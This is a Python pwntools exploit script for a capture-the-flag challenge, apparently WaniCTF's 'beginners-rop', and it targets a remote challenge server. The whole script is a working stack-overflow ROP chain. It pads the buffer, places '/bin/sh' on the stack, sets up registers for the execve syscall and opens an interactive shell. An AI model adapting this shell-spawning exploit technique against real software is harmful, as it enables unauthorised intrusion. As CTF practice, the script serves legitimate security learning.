#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./chall"
#libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("beginners-rop-pwn.wanictf.org", 9005)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *main+231
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


rop_syscall_ret = 0x004013af
rop_pop_rax = 0x00401371
rop_mov_rdi_rsp_add_rsp_8_ret = 0x0040139c
rop_xor_rsi_rsi_ret = 0x0040137e
rop_xor_rdx_rdx_ret = 0x0040138d

payload = b"A" * 0x8 * 5
payload += p64(rop_mov_rdi_rsp_add_rsp_8_ret)
payload += b"/bin/sh\0"
payload += p64(rop_pop_rax)
payload += p64(59)# execve
payload += p64(rop_xor_rdx_rdx_ret)
payload += p64(rop_xor_rsi_rsi_ret)
payload += p64(rop_syscall_ret)

p.recvuntil(">")
p.send(payload)

p.interactive()
